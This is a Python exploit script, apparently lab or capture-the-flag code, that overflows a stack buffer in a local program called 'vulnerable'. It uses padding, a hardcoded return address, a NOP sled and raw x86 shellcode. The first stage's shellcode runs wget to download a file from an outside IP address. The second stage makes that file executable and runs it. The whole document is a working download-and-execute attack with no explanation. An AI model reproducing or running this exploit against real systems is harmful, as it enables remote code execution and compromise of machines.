import struct
from subprocess import Popen, PIPE, run

def conv(num):
    return struct.pack("<I", num)

def run_like_shell(stage_name, payload, filename):
    print(f"\n{stage_name}...")

    with open(filename, "wb") as f:
        f.write(payload + b"\n")

    run(f"./vulnerable < {filename}", shell=True)

def main():
    offset = 76
    ret_addr = 0xffffd500 
    
    # shellcode 1: wget payload
    download_shellcode = (
        b"\x6a\x0b\x58\x99\x52\x68\x37\x30\x2f\x78"
        b"\x68\x39\x32\x2e\x31\x68\x37\x38\x2e\x31"
        b"\x68\x31\x38\x2e\x31\x89\xe1\x52\x6a\x74"
        b"\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e"
        b"\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53"
        b"\x89\xe1\xcd\x80"
    )

    # shellcode 2: chmod + exec
    execute_shellcode = (
        b"\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3"
        b"\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50"
        b"\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0"
        b"\x0b\xcd\x80"
    )

    nop_sled = b"\x90" * 100

    # payload = padding + return address + NOP sled + shellcode
    payload_stage1 = b"A" * offset + conv(ret_addr) + nop_sled + download_shellcode
    payload_stage2 = b"A" * offset + conv(ret_addr) + nop_sled + execute_shellcode


    run_like_shell("Stage 1: Download payload", payload_stage1, "payload_stage1")
    run_like_shell("Stage 2: Execute downloaded payload", payload_stage2, "payload_stage2")

if __name__ == '__main__':
    main()
